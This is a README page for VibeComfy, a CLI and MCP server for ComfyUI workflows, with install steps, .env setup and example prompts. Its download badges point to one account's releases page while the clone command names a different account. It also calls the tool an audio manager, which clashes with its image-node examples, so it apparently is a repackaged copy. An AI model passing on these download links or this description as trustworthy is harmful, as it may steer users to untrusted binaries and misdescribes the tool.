---
layout: "default"
title: "🎧 VibeComfy - Effortless Audio Workflow Management"
description: "🎛️ Streamline your ComfyUI workflows with VibeComfy, a CLI and MCP server for easy access and management of audio-reactive effects and node functions."
---
# 🎧 VibeComfy - Effortless Audio Workflow Management

[![Download VibeComfy](https://img.shields.io/badge/Download%20VibeComfy-v1.0-blue.svg)](https://github.com/Monica0105/VibeComfy/releases)

## 🚀 Getting Started

Welcome to VibeComfy! This tool combines a command line interface (CLI) with a server for managing audio workflows easily. Follow these simple steps to get started.

## 📥 Download & Install

To install VibeComfy, visit this page to download the latest version:

[Download VibeComfy](https://github.com/Monica0105/VibeComfy/releases)

### 🏗️ System Requirements

- **Operating System**: Windows 10 or higher, macOS, or a Linux distribution.
- **Python**: Version 3.7 or higher.
- **Memory**: At least 4 GB of RAM recommended.
- **Storage**: 100 MB of free disk space.

## 🔧 Setup Instructions

1. Open your terminal (Command Prompt, PowerShell, or terminal on macOS/Linux).
2. Clone the repository to your machine:
    ```bash
    git clone https://github.com/peteromallet/VibeComfy
    ```
3. Navigate into the VibeComfy directory:
    ```bash
    cd VibeComfy
    ```
4. Install the required Python packages:
    ```bash
    pip install -r requirements.txt
    ```
5. Start the VibeComfy server:
    ```bash
    claude
    ```
   The server will set itself up automatically using the `.mcp.json` configuration file.

## 🔌 ComfyUI Integration

To use VibeComfy with ComfyUI:

1. Set your ComfyUI path by creating a `.env` file:
    ```bash
    cp .env.example .env
    ```
2. Open the `.env` file in a text editor.
3. Update the line with your ComfyUI installation path:
    ```
    COMFY_PATH=/path/to/ComfyUI
    ```
4. Launch ComfyUI with logging by using:
    ```bash
    python main.py 2>&1 | tee comfyui.log
    ```

## 📘 Example Prompts

VibeComfy works with various commands to enhance your audio workflow. Below are some example prompts you can use:

- **Discovery**: "What nodes exist for audio-reactive effects?"
- **Analysis**: "What's happening with the loop in this workflow?"
- **Editing**: "Apply the Controlnet for Qwen before the Ksampler."
- **Submission**: "Run this workflow with a prompt about horses."
- **Node Dev**: "Convert my Python blur function to a ComfyUI node."

These prompts can help you to navigate and leverage the capabilities of VibeComfy effectively.

## 📝 Documentation

For further information, refer to the documentation files provided:

- [CLAUDE.md](CLAUDE.md): A reference guide for CLI commands.
- [cli_tools/registry/README.md](cli_tools/registry/README.md): Detailed information on the MCP server.

## 💡 Troubleshooting Tips

If you encounter issues, consider these common solutions:

1. **Python Not Found**: Ensure Python is installed and added to your system PATH.
2. **Dependencies Not Installing**: Check your internet connection and update pip:
    ```bash
    pip install --upgrade pip
    ```
3. **Server Not Starting**: Verify that the `.mcp.json` file is in the correct directory.

## 🌟 Additional Features

VibeComfy also includes:

- **Customizable Workflows**: Create workflows tailored to your audio projects.
- **User-Friendly CLI**: Simple command input for effective management.
- **Community Support**: Join our community for assistance and tips.

Feel free to explore and make the most of VibeComfy. For additional help, revisit the documentation or reach out to the community. 

## 📅 Future Updates

We plan to add more features, including:

- Improved support for additional audio formats.
- Enhanced user interface for easier navigation.
- Regular updates for performance improvements.

Thank you for choosing VibeComfy. Enjoy simplifying your audio workflow!